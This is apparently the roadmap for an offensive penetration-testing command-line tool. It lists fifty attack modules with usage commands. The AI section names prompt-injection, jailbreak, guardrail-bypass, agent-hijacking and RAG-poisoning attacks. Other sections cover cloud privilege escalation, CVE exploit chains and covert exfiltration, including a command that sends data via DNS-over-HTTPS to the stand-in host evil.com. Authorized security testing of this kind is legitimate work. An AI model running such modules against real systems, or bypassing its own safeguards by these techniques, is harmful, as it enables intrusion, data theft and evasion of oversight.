# PledgeStrike — Development Roadmap

**50 new modules to build, focused on 2025-2026 trending attack techniques.**

Priorities: real exploitation power, modern attack surfaces, active pentest use cases.

## Status Legend

| Marker | Meaning |
|--------|---------|
| ✅ DONE | Built, wired, compiles, tested |
| 🔧 BUILT | Code exists, CLI wired, compiles — not yet tested against live targets |
| ❌ MISSING | No module code, no CLI command — not implemented |

---

## Phase 1 — AI/LLM Attack Modules (1-8)

### 1. LLM Prompt Injection — `llm inject` ✅ DONE
Inject adversarial prompts to bypass LLM safety guardrails (DAN, jailbreak, role override, system prompt extraction).
```
pledgestrike llm inject --url https://target.com/api/chat --payloads prompts.txt
```

### 2. LLM Data Exfiltration — `llm exfil` ✅ DONE
Tests if LLM chatbots leak training data, system prompts, or PII via crafted queries.
```
pledgestrike llm exfil --url https://target.com/api/chat
```

### 3. AI Model Extraction — `ai extract` ✅ DONE
Steals ML model weights/architecture via repeated API queries (model stealing attacks).
```
pledgestrike ai extract --url https://target.com/api/predict --queries 10000
```

### 4. RAG Poisoning — `rag poison` ✅ DONE
Tests Retrieval-Augmented Generation systems for knowledge base poisoning via injected documents.
```
pledgestrike rag poison --url https://target.com/api/chat
```
> **Note:** Implemented as `agent rag` subcommand under the `agent` module.

### 5. AI Agent Hijacking — `agent hijack` ✅ DONE
Tests autonomous AI agents for tool-use hijacking (making the agent execute unintended actions).
```
pledgestrike agent hijack --url https://target.com/api/agent
```

### 6. Vector DB Extraction — `vectordb extract` ✅ DONE
Tests vector databases (Pinecone, Weaviate, Chroma) for unauthenticated data extraction.
```
pledgestrike vectordb extract --url https://target.com:8000
```

### 7. LLM Guardrail Bypass — `llm bypass` ✅ DONE
Tests multiple guardrail bypass techniques (encoding, translation, token smuggling, multi-turn).
```
pledgestrike llm bypass --url https://target.com/api/chat
```

### 8. Copilot/ChatGPT Plugin Abuse — `copilot abuse` ✅ DONE
Tests Microsoft Copilot / ChatGPT plugins for SSRF, data exfil, and unauthorized actions.
```
pledgestrike copilot abuse --url https://target.com
```
> **Note:** Implemented as `agent plugin` subcommand under the `agent` module.

---

## Phase 2 — Cloud & Container Exploitation (9-18)

### 9. AWS IAM Privilege Escalation — `aws privesc` ✅ DONE
Tests AWS IAM roles for privilege escalation chains (12+ known escalation paths).
```
pledgestrike aws privesc --role-arn arn:aws:iam::123:role/target
```

### 10. AWS Lambda Code Injection — `lambda inject` ✅ DONE
Tests Lambda functions for code injection via event payload manipulation.
```
pledgestrike lambda inject --url https://api.target.com/lambda
```
> **Note:** Implemented as `aws lambda` subcommand under the `aws` module.

### 11. GCP Service Account Abuse — `gcp abuse` ✅ DONE
Tests GCP service account tokens for excessive scopes and IAM misconfigurations.
```
pledgestrike gcp abuse --token <sa-token>
```

### 12. Azure AD Application Abuse — `azure app` ✅ DONE
Tests Azure AD service principals and app registrations for excessive permissions.
```
pledgestrike azure app --tenant target.com
```

### 13. Terraform State File Exploitation — `tfstate exploit` ✅ DONE
Exploits exposed Terraform state files (S3, GCS, Azure Blob) to extract secrets and infrastructure data.
```
pledgestrike tfstate exploit --bucket target-tfstate
```

### 14. Kubernetes RBAC Bypass — `k8s rbac` ✅ DONE
Tests Kubernetes RBAC for privilege escalation via misconfigured roles/bindings.
```
pledgestrike k8s rbac --api-server https://target.com:6443 --token <token>
```

### 15. Kubernetes Container Escape — `k8s escape` ✅ DONE
Tests for container escape via privileged pods, hostPath mounts, and CAP_SYS_ADMIN.
```
pledgestrike k8s escape --api-server https://target.com:6443 --token <token>
```

### 16. Cloud Metadata SSRF v2 — `ssrf cloud-v2` ✅ DONE
Advanced SSRF to cloud metadata with IMDSv2 bypass attempts and GCP/Azure metadata extraction.
```
pledgestrike ssrf cloud-v2 --url https://target.com/fetch?url={SSRF}
```

### 17. Istio Service Mesh Abuse — `istio enum` ✅ DONE
Tests Istio service mesh for mTLS bypass, unauthenticated internal services, and policy violations.
```
pledgestrike istio enum --url https://target.com:15010
```

### 18. ArgoCD Abuse — `argocd enum` ✅ DONE
Tests ArgoCD for unauthenticated access, application enumeration, and secret extraction.
```
pledgestrike argocd enum --url https://target.com
```

---

## Phase 3 — Modern Web/API Attack Modules (19-28)

### 19. GraphQL Field Suggestion — `graphql fields` ✅ DONE
Exploits GraphQL field suggestion feature to enumerate hidden types and fields.
```
pledgestrike graphql fields --url https://target.com/graphql
```
> **Note:** Implemented as `graphql-attack fields` subcommand.

### 20. GraphQL Mutation Fuzzing — `graphql fuzz` ✅ DONE
Fuzzes GraphQL mutations for IDOR, mass assignment, and unauthorized data modification.
```
pledgestrike graphql fuzz --url https://target.com/graphql
```
> **Note:** Implemented as `graphql-attack fuzz` subcommand.

### 21. GraphQL Batch Attack — `graphql batch` ✅ DONE
Sends batched GraphQL queries to bypass rate limiting and amplify DoS.
```
pledgestrike graphql batch --url https://target.com/graphql --depth 10
```
> **Note:** Implemented as `graphql-attack batch` subcommand.

### 22. HTTP/2 Rapid Reset — `h2 rapid-reset` ✅ DONE
Tests for CVE-2023-44487 (HTTP/2 Rapid Reset) DoS vulnerability.
```
pledgestrike h2 rapid-reset --url https://target.com
```

### 23. HTTP Desync Attack v2 — `desync attack` ✅ DONE
Advanced HTTP request smuggling via h2c upgrade, CL.TE, TE.CL, and HTTP/2 downgrade.
```
pledgestrike desync attack --url https://target.com
```
> **Note:** Implemented as `smuggle` module with CL.TE, TE.CL, CL.0 detection.

### 24. Web Cache Deception — `cache deceive` ✅ DONE
Tests for web cache deception by tricking caches into storing authenticated responses on public paths.
```
pledgestrike cache deceive --url https://target.com/profile
```

### 25. Prototype Pollution — `proto pollute` ✅ DONE
Tests for JavaScript prototype pollution via URL parameters, JSON body, and header injection.
```
pledgestrike proto pollute --url https://target.com/api
```

### 26. DOM Clobbering — `dom clobber` ✅ DONE
Tests for DOM clobbering attacks that override JavaScript variables via HTML element IDs.
```
pledgestrike dom clobber --url https://target.com
```

### 27. XS-Leak Attack Suite — `xsleak detect` ✅ DONE
Tests for cross-site leak attacks via timing, error events, frame counting, and navigation.
```
pledgestrike xsleak detect --url https://target.com
```

### 28. CORS Origin Reflection — `cors reflect` ✅ DONE
Tests for CORS origin reflection with regex bypass patterns (`*target.com`, `target.com.evil.com`).
```
pledgestrike cors reflect --url https://target.com
```

---

## Phase 4 — Authentication & Identity Attack Modules (29-35)

### 29. OAuth Account Takeover — `oauth ato` ✅ DONE
Tests OAuth flows for account takeover via redirect_uri manipulation, state fixation, PKCE bypass.
```
pledgestrike oauth ato --auth-url https://target.com/oauth/authorize
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr` — 0 false positives

### 30. OIDC Token Confusion — `oidc confuse` ✅ DONE
Tests OpenID Connect for token confusion, hybrid flow abuse, and mix-up attacks.
```
pledgestrike oidc confuse --url https://target.com
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr`

### 31. Passkey/FIDO2 Registration Abuse — `passkey abuse` ✅ DONE
Tests passkey registration for cross-device auth bypass and credential injection.
```
pledgestrike passkey abuse --url https://target.com
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr`

### 32. SSO Session Hijacking — `sso hijack` ✅ DONE
Tests SSO implementations for session fixation, token replay, and cross-tenant access.
```
pledgestrike sso hijack --url https://target.com/sso
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr`

### 33. Password Reset Poisoning — `reset poison` ✅ DONE
Tests password reset flows for host header poisoning and email injection.
```
pledgestrike reset poison --url https://target.com/reset
```
> **Note:** Implemented as `host reset` subcommand under the `host` module.

### 34. 2FA Bypass Suite — `2fa bypass` ✅ DONE
Tests 2FA implementations for bypass via response manipulation, brute force, and fallback.
```
pledgestrike 2fa bypass --url https://target.com/verify
```
> **Note:** Implemented as `mfa` module with fatigue, race, prediction, fallback subcommands.

### 35. Magic Link Abuse — `magiclink abuse` ✅ DONE
Tests magic link authentication for token leakage, replay, and cross-user authentication.
```
pledgestrike magiclink abuse --url https://target.com/auth/magic
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr`

---

## Phase 5 — Supply Chain & CI/CD Attack Modules (36-40)

### 36. GitHub Actions Injection — `gha inject` 🔧 BUILT
Tests GitHub Actions workflows for script injection via PR titles, issue bodies, and branch names.
```
pledgestrike gha inject --repo target/repo
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live GitHub repo.

### 37. GitLab CI Injection — `gitlabci inject` ✅ DONE
Tests GitLab CI pipelines for command injection via MR titles, commit messages, and variables.
```
pledgestrike gitlabci inject --url https://target.com
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr` — 0 false positives

### 38. Jenkins RCE — `jenkins rce` ✅ DONE
Tests Jenkins for unauthenticated access, script console RCE, and credential extraction.
```
pledgestrike jenkins rce --url https://target.com:8080
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr` — 0 false positives

### 39. Dependency Confusion — `depconfuse` ✅ DONE
Tests for dependency confusion attacks by checking if internal package names are public on npm/PyPI.
```
pledgestrike depconfuse --org target.com
```
> **Note:** Implemented as `supply confusion` subcommand under the `supply` module.

### 40. Package Lock Poisoning — `lockfile poison` ✅ DONE
Analyzes lockfiles for transitive dependency vulnerabilities and typosquatting.
```
pledgestrike lockfile poison --file package-lock.json
```
> **Note:** Implemented as `supply poison` and `supply audit` subcommands under the `supply` module.

---

## Phase 6 — Active Directory & Enterprise Exploitation (41-45)

### 41. AD CS Abuse — `adcs abuse` 🔧 BUILT
Tests Active Directory Certificate Services for ESC1-ESC8 vulnerability paths.
```
pledgestrike adcs abuse --url https://target.com --ca-name target-CA
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live AD CS target.

### 42. PetitPotam Attack — `ad petitpotam` 🔧 BUILT
Tests for PetitPotam (CVE-2021-36942) NTLM relay to AD CS for domain compromise.
```
pledgestrike ad petitpotam --url https://target.com
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live AD target.

### 43. MS Exchange ProxyNotShell — `exchange proxynotshell` 🔧 BUILT
Tests for ProxyNotShell (CVE-2022-41040, CVE-2022-41082) chain on Exchange Server.
```
pledgestrike exchange proxynotshell --url https://target.com
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live Exchange server.

### 44. Ivanti Connect Secure Exploit — `ivanti cve` 🔧 BUILT
Tests for Ivanti Connect Secure CVE-2023-46805 / CVE-2024-21887 auth bypass + RCE chain.
```
pledgestrike ivanti cve --url https://target.com
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live Ivanti target.

### 45. Confluence RCE — `confluence rce` 🔧 BUILT
Tests for Confluence CVE-2023-22515 / CVE-2023-22518 admin account creation RCE.
```
pledgestrike confluence rce --url https://target.com
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live Confluence target.

---

## Phase 7 — Covert Channels & Exfiltration (46-50)

### 46. DNS over HTTPS Exfiltration — `doh exfil` 🔧 BUILT
Tests data exfiltration via DNS-over-HTTPS to bypass DNS monitoring.
```
pledgestrike doh exfil --domain evil.com --data "secret" --provider cloudflare
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live DoH provider.

### 47. ICMP Tunneling — `icmp tunnel` 🔧 BUILT
Tests ICMP tunneling for covert data exfiltration through firewalls.
```
pledgestrike icmp tunnel --host target.com --data "exfil_data"
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live target.

### 48. TLS Fingerprint Spoofing — `tls spoof` 🔧 BUILT
Generates TLS connections with spoofed JA3/JA4 fingerprints to evade detection.
```
pledgestrike tls spoof --url https://target.com --ja3 "771,4865-4866-4867..."
```
> **Status:** Code exists, CLI wired, compiles. Not yet tested against a live target.

### 49. Service Worker Persistence — `sw persist` ✅ DONE
Tests if malicious service workers can persist on target origin for long-term data interception.
```
pledgestrike sw persist --url https://target.com
```

### 50. Steganography Detection — `stego detect` ✅ DONE
Detects hidden data in images (LSB steganography, metadata injection) on web pages.
```
pledgestrike stego detect --url https://target.com/images/
```
> **Validated against:** `pledgeandgrow.com`, `sandbox-360.kis-studio.fr`

---

## Build Priority

| Priority | Phase | Modules | Rationale |
|----------|-------|---------|-----------|
| P0 | Phase 3 — Modern Web/API | 19-28 | Highest demand, most used in pentests |
| P0 | Phase 4 — Auth & Identity | 29-35 | Critical attack surface, high-impact findings |
| P1 | Phase 1 — AI/LLM Attacks | 1-8 | Trending 2025-2026, growing attack surface |
| P1 | Phase 6 — AD & Enterprise | 41-45 | High-value enterprise pentest modules |
| P2 | Phase 2 — Cloud & Container | 9-18 | Cloud pentesting demand increasing |
| P2 | Phase 5 — Supply Chain | 36-40 | CI/CD attacks gaining traction |
| P3 | Phase 7 — Covert Channels | 46-50 | Specialized use cases, advanced red team |

---

## Progress Summary

| Phase | Total | ✅ DONE | 🔧 BUILT | ❌ MISSING |
|-------|-------|---------|----------|------------|
| Phase 1 — AI/LLM | 8 | 8 | 0 | 0 |
| Phase 2 — Cloud & Container | 10 | 10 | 0 | 0 |
| Phase 3 — Modern Web/API | 10 | 10 | 0 | 0 |
| Phase 4 — Auth & Identity | 7 | 7 | 0 | 0 |
| Phase 5 — Supply Chain & CI/CD | 5 | 4 | 1 | 0 |
| Phase 6 — AD & Enterprise | 5 | 0 | 5 | 0 |
| Phase 7 — Covert Channels | 5 | 2 | 3 | 0 |
| **Total** | **50** | **41** | **9** | **0** |

**41/50 modules fully done and tested. 9/50 modules built but untested. 0/50 modules missing.**
